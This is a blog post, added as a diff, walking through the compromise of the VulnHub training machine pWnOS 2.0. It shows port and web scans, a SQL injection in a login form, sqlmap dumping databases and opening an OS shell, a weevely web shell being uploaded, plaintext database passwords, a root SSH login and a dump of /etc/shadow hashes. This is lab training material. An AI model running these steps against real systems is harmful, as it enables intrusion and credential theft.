@@ -1,0 +1,220 @@
+---
+layout: post
+title: "pWnOS: 2.0"
+date: 2015-05-22 08:40:50 +0200
+comments: true
+categories: [vulnhub, pwnos]
+---
+Image: [pWnOS: 2.0 (Pre-Release)](https://www.vulnhub.com/entry/pwnos-20-pre-release,34/)
+
+Nmap output:
+{% codeblock %}
+root@kali32:~# nmap 10.10.10.100 -sV -p-
+
+Starting Nmap 6.47 ( http://nmap.org ) at 2015-04-27 14:45 CEST
+Stats: 0:00:07 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
+Service scan Timing: About 50.00% done; ETC: 14:45 (0:00:06 remaining)
+Nmap scan report for 10.10.10.100
+Host is up (0.00030s latency).
+Not shown: 65533 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 5.8p1 Debian 1ubuntu3 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.2.17 ((Ubuntu))
+MAC Address: 00:0C:29:61:0D:EB (VMware)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 7.54 seconds
+{% endcodeblock %}
+
+Nikto output:
+{% codeblock %}
+root@kali32:~# nikto -h 10.10.10.100
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          10.10.10.100
++ Target Hostname:    10.10.10.100
++ Target Port:        80
++ Start Time:         2015-04-27 14:46:59 (GMT2)
+---------------------------------------------------------------------------
++ Server: Apache/2.2.17 (Ubuntu)
++ Cookie PHPSESSID created without the httponly flag
++ Retrieved x-powered-by header: PHP/5.3.5-1ubuntu7
++ The anti-clickjacking X-Frame-Options header is not present.
++ Uncommon header 'tcn' found, with contents: list
++ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.php
++ Apache/2.2.17 appears to be outdated (current is at least Apache/2.4.7). Apache 2.0.65 (final release) and 2.2.26 are also current.
++ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
++ OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
++ OSVDB-12184: /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
++ OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
++ OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
++ OSVDB-3268: /includes/: Directory indexing found.
++ OSVDB-3092: /includes/: This might be interesting...
++ OSVDB-3092: /info/: This might be interesting...
++ OSVDB-3092: /login/: This might be interesting...
++ OSVDB-3092: /register/: This might be interesting...
++ OSVDB-3233: /info.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information.
++ OSVDB-3268: /icons/: Directory indexing found.
++ Server leaks inodes via ETags, header found with file /icons/README, inode: 1311031, size: 5108, mtime: Tue Aug 28 12:48:10 2007
++ OSVDB-3233: /icons/README: Apache default file found.
++ OSVDB-5292: /info.php?file=http://cirt.net/rfiinc.txt?: RFI from RSnake's list (http://ha.ckers.org/weird/rfi-locations.dat) or from http://osvdb.org/
++ /login.php: Admin login page/section found.
++ 7331 requests: 0 error(s) and 22 item(s) reported on remote host
++ End Time:           2015-04-27 14:47:09 (GMT2) (10 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+{% endcodeblock %}
+
+There is a SQL injection in email, we can see an error message trying to log in (filling an email field with the single quote):
+{% codeblock %}
+http://10.10.10.100/login.php:
+
+An error occurred in script '/var/www/login.php' on line 47: Query: SELECT *
+FROM users WHERE email=''' AND pass='86f7e437faa5a7fce15d1ddcb9eaeaea377667b8'
+AND active IS NULL 
+
+MySQL Error: You have an error in your SQL syntax; check the
+manual that corresponds to your MySQL server version for the right syntax to
+use near '86f7e437faa5a7fce15d1ddcb9eaeaea377667b8' AND active IS NULL' at line 1 
+{% endcodeblock %}
+
+Using Sqlmap we dump the whole databases:
+{% codeblock %}
+$ sqlmap -u "http://10.10.10.100/login.php" --forms --dump-all
+[ .. snip .. ]
+email=test@test.com&pass=123&submit=Login&submitted=TRUE
+{% endcodeblock %}
+
+We try to crack hashes but without success in the reasonable time:
+{% codeblock %}
+root@kali32:~/.sqlmap/output/10.10.10.100/dump# cat mysql/user-f3649c95.csv | cut -d, -f2-3 | sed 's#,#:#' > /tmp/hashes.csv
+root@kali32:~/.sqlmap/output/10.10.10.100/dump# john --format=mysql-sha1 /tmp/hashes.csv 
+[ .. snip .. ]
+root@kali32:~/.sqlmap/output/10.10.10.100/dump# cat ch16/users.csv 
+user_id,pass,email,active,last_name,first_name,user_level,registration_date
+1,c2c4b4e51d9e23c02c15702c136c3e950ba9a4af,admin@isints.com,NULL,Privett,Dan,0,2011-05-07 17:27:01
+{% endcodeblock %}
+
+With OS Shell functionality of Sqlmap (--os-shell), we was able to obtain shell with the web user privileges:
+{% codeblock %}
+os-shell> cat /etc/passwd
+do you want to retrieve the command standard output? [Y/n/a] y
+command standard output:
+---
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/bin/sh
+man:x:6:12:man:/var/cache/man:/bin/sh
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+mail:x:8:8:mail:/var/mail:/bin/sh
+news:x:9:9:news:/var/spool/news:/bin/sh
+uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+proxy:x:13:13:proxy:/bin:/bin/sh
+www-data:x:33:33:www-data:/var/www:/bin/sh
+backup:x:34:34:backup:/var/backups:/bin/sh
+list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+syslog:x:101:103::/home/syslog:/bin/false
+mysql:x:0:0:MySQL Server,,,:/root:/bin/bash
+sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin
+landscape:x:104:110::/var/lib/landscape:/bin/false
+dan:x:1000:1000:Dan Privett,,,:/home/dan:/bin/bash
+{% endcodeblock %}
+
+As we can see, MySQL daemon is running as root (=uid 0), this is also the
+reason, why we were able to write something with database user to /var/www
+(owned by www-data), that's not common.
+
+We can also upload weevely to the remote system and use it as the more sophisticated shell:
+{% codeblock %}
+root@kali32:~# sqlmap -u "http://10.10.10.100/login.php" --data "email=test@test.com&pass=123&submit=Login&submitted=TRUE" --file-write="/var/www/weevely.php.txt" --file-dest=/var/www/w.php
+{% endcodeblock %}
+
+We found the database credentials, however they didn't work:
+{% codeblock %}
+www-data@web:/var/www $ cat mysqli_connect.php
+<?php # Script 8.2 - mysqli_connect.php
+
+// This file contains the database access information.
+// This file also establishes a connection to MySQL
+// and selects the database.
+
+// Set the database access information as constants:
+
+DEFINE ('DB_USER', 'root');
+DEFINE ('DB_PASSWORD', 'goodday');
+DEFINE ('DB_HOST', 'localhost');
+DEFINE ('DB_NAME', 'ch16');
+
+// Make the connection:
+
+$dbc = @mysqli_connect (DB_HOST, DB_USER, DB_PASSWORD, DB_NAME) OR die ('Could not connect to MySQL: ' . mysqli_connect_error() );
+
+?>
+{% endcodeblock %}
+
+That was strange, because the web application is connected. After a little more digging, we found this suspicious file:
+{% codeblock %}
+www-data@web:/var/www $ cat ../mysqli_connect.php
+<?php # Script 8.2 - mysqli_connect.php
+
+// This file contains the database access information.
+// This file also establishes a connection to MySQL
+// and selects the database.
+
+// Set the database access information as constants:
+
+DEFINE ('DB_USER', 'root');
+DEFINE ('DB_PASSWORD', 'root@ISIntS');
+DEFINE ('DB_HOST', 'localhost');
+DEFINE ('DB_NAME', 'ch16');
+
+// Make the connection:
+
+$dbc = @mysqli_connect (DB_HOST, DB_USER, DB_PASSWORD, DB_NAME) OR die ('Could not connect to MySQL: ' . mysqli_connect_error() );
+
+?>
+{% endcodeblock %}
+
+The [blog application](http://10.10.10.100/blog/index.php) use the text files instead of MySQL. We were only
+able to locate the password file, without cracking it:
+{% codeblock %}
+www-data@web:/var/www $ cat blog/config/password.txt
+$1$weWj5iAZ$NU4CkeZ9jNtcP/qrPC69a/
+{% endcodeblock %}
+
+Using root / root@ISIntS we can finally log in via ssh as root:
+{% codeblock %}
+root@web:~# cat /etc/shadow 
+root:$6$aO1TGdyc$XfiMyap/.QYhjIip5xxrgpO1ydlo.DQXns3fYYLt1hiH4Fp0PJP4TMoDSg3wpAFklF03dV2cUDL04YcR9bSSI/:15101:0:99999:7:::
+daemon:*:15101:0:99999:7:::
+bin:*:15101:0:99999:7:::
+sys:*:15101:0:99999:7:::
+sync:*:15101:0:99999:7:::
+games:*:15101:0:99999:7:::
+man:*:15101:0:99999:7:::
+lp:*:15101:0:99999:7:::
+mail:*:15101:0:99999:7:::
+news:*:15101:0:99999:7:::
+uucp:*:15101:0:99999:7:::
+proxy:*:15101:0:99999:7:::
+www-data:*:15101:0:99999:7:::
+backup:*:15101:0:99999:7:::
+list:*:15101:0:99999:7:::
+irc:*:15101:0:99999:7:::
+gnats:*:15101:0:99999:7:::
+nobody:*:15101:0:99999:7:::
+libuuid:!:15101:0:99999:7:::
+syslog:*:15101:0:99999:7:::
+mysql:!:15101:0:99999:7:::
+sshd:*:15101:0:99999:7:::
+landscape:*:15101:0:99999:7:::
+dan:$6$Iu1ipXkP$F9Jdj7JNf56/UjrXgOTks3mqYO6J/ErWUtf.EWr2AT8lv6aHy3K6Ywjmd7HCUswgiEYDHMwq/aqwJToXl0ERs1:15101:0:99999:7:::
+{% endcodeblock %}
